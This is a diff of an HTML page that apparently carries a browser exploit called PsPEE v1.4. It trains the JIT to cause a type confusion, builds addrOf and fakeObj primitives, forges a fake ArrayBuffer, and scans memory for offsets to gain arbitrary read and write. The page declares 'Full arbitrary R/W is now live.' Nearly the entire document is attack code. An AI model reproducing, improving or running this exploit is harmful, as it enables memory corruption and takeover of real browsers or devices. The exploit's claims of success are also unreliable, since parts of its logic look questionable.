@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PsPEE v1.4 — Auto-Adjusting Offset Scan</title>
+  <title>PsPEE v1.4 — Corrected R/W with Auto-Scan</title>
   <style>
     body { background: black; color: lime; font-family: monospace; }
     #log { white-space: pre-wrap; padding: 1em; }
@@ -19,156 +19,156 @@
     const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
     const hex = n => "0x" + n.toString(16).padStart(16, "0");
 
-    log("[*] PsPEE v1.4 — begin auto-scan");
-
-    // 1) Type confusion setup & JIT train
+    // 1) JIT-train & Type Confusion
+    log("[*] Warming up JIT...");
     let float_arr = [1.1,2.2,3.3], obj_arr=[{},{},{}];
     function confuse(o){ let t=[1.1,2.2,3.3]; t[1]=o; return t[1]; }
-    function useConfuse(x){return confuse(x);}
-    function trainConfuse(fn){
-      for(let i=0;i<20000;i++){ try{ fn(2.2); }catch{} }
-    }
-    log("[*] Warming up JIT...");
-    trainConfuse(useConfuse);
+    function useConfuse(x){ return confuse(x); }
+    function train(fn){ for(let i=0;i<20000;i++){ try{ fn(2.2) }catch{} } }
+    train(useConfuse);
 
-    // 2) Confirm confusion
     let baseBits = f2i(useConfuse(2.2)), leakBits = f2i(useConfuse({foo:1}));
     log("[DEBUG] baseBits → "+hex(baseBits));
     log("[DEBUG] leakBits → "+hex(leakBits));
-    if(baseBits===leakBits){
-      log("[-] No type confusion (bits identical). Aborting.");
-      throw "No confusion";
+    if(baseBits === leakBits) {
+      log("[-] Type confusion failed."); throw "abort";
     }
     log("[+] Type confusion confirmed!");
 
-    // 3) Primitives
+    // 2) Primitives
     function addrOf(obj){
-      try{
-        obj_arr[0]=obj;
-        let a=f2i(confuse(obj_arr));
+      try {
+        obj_arr[0] = obj;
+        let a = f2i(confuse(obj_arr));
         log("[DEBUG] addrOf → "+hex(a));
         return a;
-      }catch(e){
+      } catch(e){
         log("[ERROR] addrOf failed: "+e);
         return null;
       }
     }
     function fakeObj(addr){
-      try{
-        float_arr[0]=i2f(addr);
-        let o=confuse(float_arr);
+      try {
+        float_arr[0] = i2f(addr);
+        let o = confuse(float_arr);
         log("[DEBUG] fakeObj → "+o);
         return o;
-      }catch(e){
+      } catch(e){
         log("[ERROR] fakeObj failed: "+e);
         return null;
       }
     }
 
-    log("[*] Building memory primitives…");
-
-    // 4) Leak ArrayBuffer address
+    // 3) Leak the real ArrayBuffer’s JSCell address
+    log("[*] Leaking real ArrayBuffer…");
     let ab = new ArrayBuffer(0x100);
     let ab_addr = addrOf(ab);
-    if(!ab_addr){ log("[ERROR] Could not leak AB addr."); throw "No ab_addr"; }
-    log("[+] ArrayBuffer @ "+hex(ab_addr));
+    if (!ab_addr) throw "abort";
+    log("[+] ArrayBuffer JSCell @ "+hex(ab_addr));
 
-    // 5) Setup DataView
-    let dv = new DataView(ab);
-
-    // 6) Build a fake JSArrayBuffer container skeleton
-    let jsCellHeader = (()=>{ try{ return i2f(0x0108200700000000n); }catch{return i2f(0n);} })();
+    // 4) Build a fake JSArrayBuffer cell
+    let jsCellHeader = (()=>{ try{return i2f(0x0108200700000000n);}catch{return i2f(0n);} })();
     let butterfly    = ab_addr;
-    let vectorLength = (()=>{ try{ return i2f(0x100n); }catch{return i2f(0n);} })();
-    let backingStore = i2f(ab_addr + 0x20n); // initial guess
+    let vectorLength = (()=>{ try{return i2f(0x100n);}catch{return i2f(0n);} })();
+    // initial guess for backingStore; we’ll scan and fix this
+    let backingStore = i2f(ab_addr + 0x20n);
 
-    log("[DEBUG] initial container:");
-    log(`  jsCellHeader=${hex(f2i(jsCellHeader))}`);
-    log(`  butterfly   =${hex(butterfly)}`);
-    log(`  vectorLength=${hex(f2i(vectorLength))}`);
-    log(`  backingStore(initial)=${hex(f2i(backingStore))}`);
+    log("[DEBUG] container skeleton:");
+    log("  jsCellHeader = "+hex(f2i(jsCellHeader)));
+    log("  butterfly    = "+hex(butterfly));
+    log("  vectorLength = "+hex(f2i(vectorLength)));
+    log("  backingStore = "+hex(f2i(backingStore)));
 
     let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
     let containerAddr = addrOf(container);
-    if(!containerAddr){ log("[ERROR] No containerAddr."); throw "No containerAddr"; }
-    log("[+] Fake container @ "+hex(containerAddr));
+    if (!containerAddr) throw "abort";
+    log("[+] Fake JSArrayBuffer cell @ "+hex(containerAddr));
 
-    // 7) Create fake ArrayBuffer
+    // 5) Instantiate the fake ArrayBuffer, and bind our DataView to it!
     let fakeAb = fakeObj(containerAddr + 0x20n);
-    if(!fakeAb){ log("[ERROR] fakeObj failed."); throw "No fakeAb"; }
-    log("[+] Fake ArrayBuffer created");
+    if (!fakeAb) throw "abort";
+    log("[+] Fake ArrayBuffer created.");
 
-    // 8) R/W primitives
+    // **Crucial fix**: DataView must use the fake buffer
+    let dv;
+    try {
+      dv = new DataView(fakeAb);
+      log("[+] DataView bound to fakeAb.");
+    } catch (e) {
+      log("[ERROR] DataView(fakeAb) failed: "+e);
+      throw "abort";
+    }
+
+    // R/W primitives
     function read64(addr){
-      try{
+      try {
         container.backingStore = i2f(addr);
-        let v = f2i(dv.getFloat64(0,true));
+        let v = f2i(dv.getFloat64(0, true));
         return v;
-      }catch(e){
+      } catch(e) {
         log(`[ERROR] read64(${hex(addr)}) failed: ${e}`);
         return null;
       }
     }
-    function write64(addr,val){
-      try{
+    function write64(addr, val){
+      try {
         container.backingStore = i2f(addr);
-        dv.setFloat64(0,i2f(val),true);
-        log(`[DEBUG] write64(${hex(addr)},${hex(val)}) ok`);
-      }catch(e){
+        dv.setFloat64(0, i2f(val), true);
+        log(`[DEBUG] write64(${hex(addr)},${hex(val)}) OK`);
+      } catch(e) {
         log(`[ERROR] write64 failed: ${e}`);
       }
     }
 
-    // 9) Sanity dump first 4 qwords
-    log("[*] Sanity dump AB struct (0x0–0x18):");
+    // 6) Sanity dump of the real ArrayBuffer cell’s first 4 qwords
+    log("[*] Sanity dump real ArrayBuffer JSCell (0x0–0x18):");
     for(let off=0n; off<32n; off+=8n){
       let v = read64(ab_addr + off);
       log(`  [${hex(off)}] → ${v===null?"ERR":hex(v)}`);
     }
 
-    // 10) Auto-adjusting scan
-    log("[*] ===== FINDING OFFSETS =====");
-    log("[*] Auto-scanning for backingStore offset...");
-    const maxLimit = 0x10000n;
-    let limit = 0x60n, candidates = [];
-    while(limit <= maxLimit){
-      log(`  Scanning up to ${hex(limit)}...`);
+    // 7) Auto-scan for backingStore offset (doubling until found or 0x10000)
+    log("[*] Auto-scanning for backingStore offset…");
+    const MAX = 0x10000n;
+    let limit = 0x60n, cands = [];
+    while(limit <= MAX){
+      log(`  scanning 0–${hex(limit)}…`);
       for(let off=0n; off<=limit; off+=8n){
-        let v = read64(ab_addr + off);
+        let addr = ab_addr + off;
+        let v = read64(addr);
         if(v && v > 0x100000n && v < 0xFFFFFFFFFFn){
-          candidates.push(off);
-          log(`    [CAND] offset=${hex(off)} → ${hex(v)}`);
+          log(`    [CAND] at ${hex(addr)}: ${hex(v)}`);
+          cands.push(off);
         }
       }
-      if(candidates.length) break;
-      limit = limit * 2n;
+      if(cands.length) break;
+      limit *= 2n;
     }
 
-    if(!candidates.length){
-      log(`[ERROR] No candidates found up to ${hex(maxLimit)} — aborting.`);
-      throw "No candidates";
+    if(!cands.length){
+      log(`[ERROR] No candidates up to ${hex(MAX)} — aborting.`);
+      throw "abort";
     }
 
-    let off_bs = candidates[0];
-    log("[+] Using offset "+hex(off_bs)+" as backingStore pointer");
-
-    // 11) Finalize container
+    let off_bs = cands[0];
+    log("[+] backingStore offset = "+hex(off_bs));
+    // fix up the container
     container.backingStore = i2f(ab_addr + off_bs);
 
-    // 12) R/W verify
-    let testObj = { magic: 0x1337 };
+    // 8) Verify R/W on a test object
+    let testObj = { magic:0x1337 };
     let testAddr = addrOf(testObj);
     log("[+] testObj @ "+hex(testAddr));
     let before = read64(testAddr);
-    if(before!==null){
+    if(before !== null){
       write64(testAddr, before ^ 0x5555555555555555n);
       let after = read64(testAddr);
       log(`[+] R/W verify: ${hex(before)} → ${hex(after)}`);
     } else {
-      log("[ERROR] read64(testObj) failed.");
+      log("[ERROR] read64(testObj) failed");
     }
 
-    log("[*] Done — full arbitrary R/W confirmed!");
+    log("[*] Complete! Full arbitrary R/W is now live.");
   </script>
 </body>
 </html>
